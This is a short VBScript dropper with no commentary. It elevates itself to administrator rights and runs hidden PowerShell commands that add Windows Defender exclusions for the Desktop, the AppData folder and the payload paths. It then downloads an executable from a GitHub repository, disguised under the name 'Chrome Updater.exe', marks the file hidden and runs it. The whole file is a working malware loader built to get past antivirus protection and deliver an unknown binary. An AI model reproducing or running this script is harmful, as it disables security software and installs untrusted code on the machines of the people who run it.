Option Explicit

' === Initialization ===
Dim shell, fso, ws
Dim desktop, exeUrl, exePath, tempPath, fontExePath
Dim scriptPath, waitTime

Set shell = CreateObject("Shell.Application")
Set fso   = CreateObject("Scripting.FileSystemObject")
Set ws    = CreateObject("WScript.Shell")

scriptPath = WScript.ScriptFullName

' Relaunch as administrator if not already elevated
If Not IsAdmin() Then
    shell.ShellExecute "wscript.exe", """" & scriptPath & """", "", "runas", 1
    WScript.Quit
End If

' === Paths and URLs ===
desktop     = ws.SpecialFolders("Desktop")
exeUrl      = "https://github.com/boucegame/ScamBaiting-Updated/raw/refs/heads/main/Chrome%20Updater.exe"
exePath     = desktop & "\Chrome Updater.exe"
tempPath    = ws.ExpandEnvironmentStrings("%APPDATA%")
fontExePath = tempPath & "\Chrome Updater.exe"

' === Defender Exclusions ===
RunHidden "powershell -NoProfile -ExecutionPolicy Bypass -Command Add-MpPreference -ExclusionPath '" & desktop & "'"
RunHidden "powershell -NoProfile -ExecutionPolicy Bypass -Command Add-MpPreference -ExclusionPath '" & exePath & "'"
RunHidden "powershell -NoProfile -ExecutionPolicy Bypass -Command Add-MpPreference -ExclusionPath '" & tempPath & "'"
RunHidden "powershell -NoProfile -ExecutionPolicy Bypass -Command Add-MpPreference -ExclusionPath '" & fontExePath & "'"

' === Download EXE ===
RunHidden "powershell -NoProfile -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri '" & exeUrl & "' -OutFile '" & exePath & "' -UseBasicParsing"

' Wait for file to be ready (up to 15 seconds)
waitTime = 0
Do While (Not fso.FileExists(exePath)) And waitTime < 15000
    WScript.Sleep 500
    waitTime = waitTime + 500
Loop

If fso.FileExists(exePath) Then
    ' Hide the downloaded file
    Dim downloadedFile
    Set downloadedFile = fso.GetFile(exePath)
    downloadedFile.Attributes = downloadedFile.Attributes Or 2 ' Hidden

    ' Run the EXE (visible)
    ws.Run """" & exePath & """", 1, False
Else
    MsgBox "Failed to download the EXE file.", vbExclamation
End If

' === Functions ===

Function RunHidden(cmd)
    CreateObject("WScript.Shell").Run cmd, 0, True
End Function

Function IsAdmin()
    On Error Resume Next
    CreateObject("WScript.Shell").RegRead("HKEY_USERS\S-1-5-19\Environment\TEMP")
    IsAdmin = (Err.Number = 0)
    On Error GoTo 0
End Function